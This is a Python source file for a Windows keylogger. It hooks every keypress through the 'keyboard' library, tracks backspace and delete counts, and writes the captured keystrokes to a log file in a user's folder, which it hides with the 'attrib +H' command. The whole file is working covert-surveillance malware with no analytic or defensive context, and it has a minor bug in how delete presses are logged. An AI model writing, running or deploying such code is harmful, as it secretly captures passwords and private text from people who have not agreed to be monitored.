import keyboard
import subprocess
import base64

# varaibles
log = "C:/Users/fadis/.log.txt"

data = []
backspace_count = 0
delete_count = 0


def on_key_press(event):
        global data, backspace_count, delete_count

        if event.name == "backspace":
            backspace_count += 1

        elif event.name == "delete":
            delete_count += 1

        else:
            if backspace_count > 0:
                data.append("\nBackSpace {}x\n".format(backspace_count))
                backspace_count = 0
            elif delete_count > 0:
                data.append("\nDelete {}x\n".format(backspace_count))
                delete_count = 0
            data.append(event.name)

try:
    with open(log, "a") as file:

        # creation and hiding of the log file
        file.write("[New log file].\n\n")
        subprocess.run(["attrib", "+H", log], check=True)
        print("Log file created and hidden successfully.")

        # setting up the key listener
        keyboard.on_press(on_key_press)

        while not keyboard.is_pressed("esc"):

            # write collected keystrokes data to the file
            if data:
                key = data.pop(0)
                if keyboard.is_pressed("enter"):
                    file.write("\n<ENTER>\n")
                elif keyboard.is_pressed("space"):
                    file.write(" <SPACE> ")
                elif keyboard.is_pressed("shift"):
                    file.write(" <SHIFT> ")
                else:
                    file.write(key)
                file.flush()

except PermissionError as e:
    print(f"PermissionError: {e}")
    print("Please check if you have the necessary permissions to write to the file.")